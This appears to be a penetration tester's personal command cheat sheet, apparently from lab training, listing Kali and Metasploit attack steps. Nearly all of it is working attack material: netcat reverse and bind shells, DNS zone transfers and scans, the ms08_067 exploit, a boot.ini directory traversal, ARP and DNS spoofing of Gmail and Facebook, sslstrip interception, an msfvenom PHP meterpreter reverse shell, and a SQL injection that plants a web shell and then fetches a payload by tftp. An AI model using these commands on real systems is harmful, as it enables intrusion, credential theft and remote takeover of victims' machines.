sudo service postgresql start
sudo service metasploit start

#check ports with ncat
nc -v x.x.x.x 80

#listen on a port
nc -lvp 1234

# listen on a port and run /bin/bash
nc -lvp -e /bin/bash

# push a command shell to a listener 
server nc -lvp 1234
client nc x.x.x.x 1234 -e /bin/bash


on litsening port can execute commands

# send files over nc
nc -lvp 1234 > netcatfile
nc x.x.x.x 1234 < mydir/myfile

# Info gathering
whois example.com
 nslookup example.com
nslookup
> set type=mx
> example.com

## name servers for domain
host -l ns zone.com
## domain transfers
host -l zone.com ns1.zone.com

## harvester
theharvester -d zone.com -l 500 -b all


workspace new-test

## SYN scan
db_nmap -v -sS 192.168.77.221
## version scan
db_nmap -v -sV 192.168.77.221
## UDP scan
db_nmap -v -sU x.x.x.x-y
##all ports version scan
db_nmap -v -p1-65535 -sV x.x.x.x
## all script scan
db_nmap -sC 192.168.77.221


## auxilary modules
use scanner/ftp/anonymous

set RHOSTS 192.168.x.x-y
exploit

## check function
use windows/smb/ms08_067_netapi
set RHOST x.x.x.x
check


# check web servers and virtual hosts
nikto -h x.x.x.x
 http://osvdb.com vulnerability respository for open source software

# check out phpmyadmin 
http://x.x.x.x/phpmyadmin

# web dav
sudo cadaver http://192.168.77.221/webdav
(default XAMPP password wampp:xampp)

# ncat check og HTTP
nc x.x.x.x 80
GET / HTTP/1.1


# with file directory download boot.ini file
nc x.x.x.x 3320
GET /../../../../../boot.ini HTTP/1.1

# sttign up ip forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# arpspoofing -t =target we want to tell we have x.x.x.x addr. x.x.x.x is the Ip adress Im pretending to be
arpspoof -i eth0 -t y.y.y.y x.x.x.x

# dns spoof
create file of domains to spoof
cat hosts.txt
192.168.77.10 www.gmail.com
192.168.77.11 www.facebook.com

dnsspoof -i eth0 -f hosts.txt

#sslstrip
## use iptabels to redirect traffic to port 80 trough SSLSTRIP on port 8080
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
sslstrip -l 8080


# creat a php meterpreter file to upload to webdav
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.77.1 LPORT=2323 -f raw > meterpreter.php
# upload to webdav by cadaver and ten execute it over http
set up metasploit
 use multi/handler
set payload php/meterpreter/reverse_tcp
set LHOST 192.168.77.1
set LPORT 2323
exploit

## SQL injection
SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\shell.php"
# defaul install of apache on windows is c:\xampp\htdocs\
browse to newly created file http://x.x.x.x/shell.php?cmd=ipconfig

can sue to upgrade shell
http://x.x.x.x/shell.php?cmd=tftp 192.168.77.1 get meterpreter.php

## set up tftp server
sudo atftpd --daemon --bind-address 192.168.77.1 /home/agasson/
